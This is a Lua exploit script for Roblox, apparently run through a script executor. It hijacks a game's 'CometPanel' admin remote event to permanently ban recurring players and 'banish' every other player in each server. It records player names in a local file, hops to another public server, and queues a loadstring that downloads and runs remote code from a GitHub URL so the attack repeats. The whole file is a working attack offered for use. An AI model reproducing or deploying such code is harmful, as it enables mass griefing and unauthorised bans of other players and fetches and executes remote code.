print("reworken teleporter initialized..")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local placeId = game.PlaceId
local currentJobId = game.JobId

local LocalPlayer

repeat
    LocalPlayer = Players.LocalPlayer
    task.wait(0.1)
until LocalPlayer

print("hacking into cometpanel..")
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local CometPanel
repeat
    CometPanel = PlayerGui:FindFirstChild("CometPanel")
    if not CometPanel then
        task.wait(0.5)
    end
until CometPanel

local Assets = CometPanel:WaitForChild("Assets")
local Utility = Assets:WaitForChild("Utility")
local Event = game:GetService("ReplicatedStorage").Modules.Network.Network.RemoteEvent
local utility = require(Utility)

local FILE = "recurring_players.txt"
local seen = {}

-- Load existing log
if isfile(FILE) then
    for line in readfile(FILE):gmatch("[^\r\n]+") do
        local name = line:match("^([^|]+)")
        if name then
            seen[name] = true
        end
    end
end

local function logPlayer(player)
    if player == LocalPlayer then
        return
    end

    local name = player.Name

    if seen[name] then
        print("[RECURRING] " .. name)

        Event:FireServer(
            "ExecuteCommand",
            "BanPlayer",
            name,
            name,
            "Other (use ban duration!)",
            "FOREVER",
            ""
        )
        return
    end

    seen[name] = true

    appendfile(FILE, name .. " | " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n")
    print("[LOGGED] " .. name)
end

for _, player in ipairs(Players:GetPlayers()) do
    logPlayer(player)
end

print("sending banish request...")

local TargetPlayers = {}

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        table.insert(TargetPlayers, player)
    end
end

Event:FireServer(
    "Starman",
    {
        Players = TargetPlayers,
        GameID = "125328885809247",
        CommandName = "BanishPlayer"
    }
)

task.wait(15)

print("server hopping...")

local success, result = pcall(function()
    return game:HttpGet(
        "https://games.roblox.com/v1/games/" .. placeId ..
        "/servers/Public?sortOrder=Asc&limit=100"
    )
end)

if success then
    local data = HttpService:JSONDecode(result)
    local servers = {}

    for _, server in ipairs(data.data) do
        if server.id ~= currentJobId and server.playing < server.maxPlayers then
            table.insert(servers, server.id)
        end
    end

    if #servers > 0 then
        local serverId = servers[math.random(1, #servers)]

        if typeof(queue_on_teleport) == "function" then
            queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/viomod/comet/refs/heads/main/main.lua'))()")
        elseif typeof(queueonteleport) == "function" then
            queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/viomod/comet/refs/heads/main/main.lua'))()")
        end

        TeleportService:TeleportToPlaceInstance(placeId, serverId, Players.LocalPlayer)
    end
end
